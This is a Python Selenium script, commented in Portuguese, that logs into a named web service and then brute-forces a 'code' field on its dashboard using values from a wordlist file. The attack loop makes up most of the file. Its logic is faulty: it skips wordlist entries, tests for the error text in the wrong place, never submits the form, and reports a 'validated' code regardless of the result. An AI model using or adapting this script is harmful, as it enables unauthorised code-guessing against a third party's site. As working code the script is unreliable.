#Importações
from selenium import webdriver
from getpass import getpass
import time

#Coletando informações
username = input("Usuário: ")
password = getpass("Senha: ")
securityCode = getpass("Código de segurança: ")

#Abrindo navegador e nova página
driver = webdriver.Chrome("C:\\Users\\tárcio\\WebDriver\\chromedriver.exe")
driver.get("https://dphsystem.com.br/login.php")

#Informações coletadas são repassadas a nova página
username_textbox = driver.find_element_by_name("username")
username_textbox.send_keys(username)

password_textbox = driver.find_element_by_name("senha")
password_textbox.send_keys(password)

driver.find_element_by_xpath(".//*[contains(text(), 'Eu tenho código de segurança')]").click()

securityCode_textbox = driver.find_element_by_name("code_1")
securityCode_textbox.send_keys(securityCode)

login_button = driver.find_element_by_name("token")
login_button.submit()

#Abrindo nova página
driver.get("https://dphsystem.com.br/dashboard")
time.sleep(3)

#Informa wordlist
lista = open('lista.txt', 'r') 

#Bruteforce
for ataque in lista:
    codigo = driver.find_element_by_name("code")
    autenticar = driver.find_element_by_class_name("btn-default")
    brute = lista.readline()

    codigo.send_keys(brute)
    if 'Código incorreto' in brute:
        print("Número testado e invalidado:", brute)
else:
    print("Número testado e validado:", brute)